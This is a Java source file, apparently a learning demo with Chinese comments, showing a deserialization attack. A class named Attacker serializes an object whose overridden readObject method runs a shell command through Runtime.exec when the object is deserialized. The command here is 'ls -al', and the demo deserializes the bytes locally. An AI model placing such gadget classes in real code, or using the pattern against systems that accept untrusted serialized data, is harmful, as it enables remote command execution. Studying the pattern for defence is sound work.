package org.feng.local.base.serialization;

import java.io.*;

public class Attacker {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 构造恶意对象
        ExecMaliciousClass execMaliciousClass = new ExecMaliciousClass("ls -al"); // 例如，执行 ls -al 命令

        // 将对象序列化
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(execMaliciousClass);
        byte[] serializedData = bos.toByteArray();

        // ... (将 serializedData 发送给目标系统) ...

        // (假设目标系统接收到 serializedData 并反序列化)
        ByteArrayInputStream bis = new ByteArrayInputStream(serializedData);
        ObjectInputStream ois = new ObjectInputStream(bis);
        Object obj = ois.readObject(); // 反序列化
    }
}

class ExecMaliciousClass implements Serializable {
    private String command;

    public ExecMaliciousClass(String command) {
        this.command = command;
    }

    private void executeCommand() {
        try {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec(command);

            // 读取标准输出
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            // 读取错误输出
            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            System.out.println("Here is the standard output of the command:\n");
            String s;
            // 读取命令的标准输出
            while ((s = stdInput.readLine()) != null) {
                System.out.println(s);
            }

            System.out.println("Here is the standard error of the command (if any):\n");
            // 读取命令的错误输出
            while ((s = stdError.readLine()) != null) {
                System.out.println(s);
            }

            // 等待命令执行完成
            int exitVal = process.waitFor();
            System.out.println("Process exitValue: " + exitVal);

            // 并发读取标准输出和错误输出
            // Thread stdOutThread = new Thread(() -> {
            //     try (BufferedReader stdOutReader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            //         String line;
            //         while ((line = stdOutReader.readLine()) != null) {
            //             System.out.println(line);
            //         }
            //     } catch (IOException e) {
            //         e.printStackTrace();
            //     }
            // });
            // stdOutThread.start();
            //
            // Thread stdErrThread = new Thread(() -> {
            //     try (BufferedReader stdErrReader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {
            //         String errLine;
            //         while ((errLine = stdErrReader.readLine()) != null) {
            //             System.err.println(errLine);
            //         }
            //     } catch (IOException e) {
            //         e.printStackTrace();
            //     }
            // });
            // stdErrThread.start();
            //
            // // 等待命令执行完成，并获取退出状态码
            // try {
            //     int exitCode = process.waitFor();
            //     System.out.println("Command exited with code: " + exitCode);
            // } catch (InterruptedException e) {
            //     Thread.currentThread().interrupt();
            // } finally {
            //     // 确保线程结束
            //     stdOutThread.interrupt();
            //     stdErrThread.interrupt();
            // }

        } catch (Exception e) {
            // 处理异常，例如记录日志
            System.err.println("Error executing command: " + e);
        }
    }

    private void readObject(java.io.ObjectInputStream in) throws java.io.IOException, ClassNotFoundException {
        in.defaultReadObject();
        executeCommand();
    }
}